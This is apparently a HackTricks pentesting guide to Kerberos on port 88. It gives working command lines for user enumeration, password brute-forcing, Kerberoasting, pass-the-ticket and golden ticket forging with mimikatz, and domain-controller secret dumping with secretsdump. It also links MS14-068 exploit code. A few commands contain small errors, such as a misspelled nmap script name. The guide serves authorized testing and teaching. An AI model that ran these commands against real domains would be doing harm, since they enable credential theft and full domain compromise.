# 88tcp/udp - Pentesting Kerberos

## Basic Information

**Kerberos** operates on a principle where it authenticates users without directly managing their access to resources. This is an important distinction because it underlines the protocol's role in security frameworks.

In environments like **Active Directory**, **Kerberos** is instrumental in establishing the identity of users by validating their secret passwords. This process ensures that each user's identity is confirmed before they interact with network resources. However, **Kerberos** does not extend its functionality to evaluate or enforce the permissions a user has over specific resources or services. Instead, it provides a secure way of authenticating users, which is a critical first step in the security process.

After authentication by **Kerberos**, the decision-making process regarding access to resources is delegated to individual services within the network. These services are then responsible for evaluating the authenticated user's rights and permissions, based on the information provided by **Kerberos** about the user's privileges. This design allows for a separation of concerns between authenticating the identity of users and managing their access rights, enabling a more flexible and secure approach to resource management in distributed networks.

Kerberos is a network authentication protocol that works on the basis of "tickets" to allow nodes to prove their identity over a non-secure network in a secure manner. Kerberos provides mutual authenticationâ€”both the user and the server verify each other's identity.

**Default Port:** 88/tcp/udp

```
PORT   STATE SERVICE
88/tcp open  kerberos-sec
```
## Recon
### Identify Kerberos
To find all machines on a network that respond to Kerberos on TCP port 88:
```
nmap -p 88 --open --script=keberos -Pn -oA nmap/Kerberos 10.0.0.0/24
```
## Enumeration
### GetUserSPNs
We can use GetUserSPNs.py from Impacket to request Service Principal Names (SPNs) which might reveal valuable information and valid usernames.
```
python GetUserSPNs.py -request -dc-ip 10.0.0.1 DOMAIN/user
```
# Attack Vectors
### Password Guessing
Test for weak passwords associated with Kerberos-enabled users.
```
kerbrute password -d domain.com -t 10.0.0.1 UsersPasswords.txt
```
## Pass the Ticket
Once a valid Kerberos ticket is obtained, PtT (Pass the Ticket) attacks can be performed using mimikatz.
```
mimikatz "kerberos::ptt ticket.kirbi"
```
Replace "ticket.kirbi" with your Kerberos ticket file.

mimikatz injects this ticket into memory, so any following command is authenticated against the Kerberos server using this ticket.

## Kerberoasting
User accounts with SPNs can be Kerberoasted. This involves requesting a service ticket for the user, which can then be cracked offline.
```
python GetUserSPNs.py -request -dc-ip 10.0.0.1 DOMAIN/user
```
# Post-Exploitation
### Secrets Dumping
Once the system is compromised, a dump of all critical data including tickets, hashes, etc. can be performed to extend the attack.
Using 'secretsdump.py' from Impacket:
```
python secretsdump.py -just-dc domain/Administrator:Password@10.0.0.1
```
Replace "domain/Administrator:Password" with the valid user and password.

## Golden Ticket Attack
### Creating a golden ticket allows virtually unrestricted access to the whole domain. For this, using mimikatz commands:
```
mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-XXXX /krbtgt:eeb9046b77d48962314e376f1925065a /id:500"
```
### **To learn how to abuse Kerberos you should read the post about** [**Active Directory**](../../windows-hardening/active-directory-methodology/)**.**

## More

### Shodan

* `port:88 kerberos`

### MS14-068

The MS14-068 flaw permits an attacker to tamper with a legitimate user's Kerberos login token to falsely claim elevated privileges, such as being a Domain Admin. This counterfeit claim is mistakenly validated by the Domain Controller, enabling unauthorized access to network resources across the Active Directory forest.

{% embed url="https://adsecurity.org/?p=541" %}

Other exploits: [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)

## HackTricks Automatic Commands

```
Protocol_Name: Kerberos    #Protocol Abbreviation if there is one.
Port_Number:  88   #Comma separated if there is more than one.
Protocol_Description: AD Domain Authentication         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for Kerberos
  Note: |
    Kerberos operates on a principle where it authenticates users without directly managing their access to resources. This is an important distinction because it underlines the protocol's role in security frameworks.
    In environments like **Active Directory**, Kerberos is instrumental in establishing the identity of users by validating their secret passwords. This process ensures that each user's identity is confirmed before they interact with network resources. However, Kerberos does not extend its functionality to evaluate or enforce the permissions a user has over specific resources or services. Instead, it provides a secure way of authenticating users, which is a critical first step in the security process.

    https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88

Entry_2:
  Name: Pre-Creds
  Description: Brute Force to get Usernames
  Command: nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}

Entry_3:
  Name: With Usernames
  Description: Brute Force with Usernames and Passwords
  Note: consider git clone https://github.com/ropnop/kerbrute.git ./kerbrute -h

Entry_4:
  Name: With Creds
  Description: Attempt to get a list of user service principal names
  Command: GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs
```
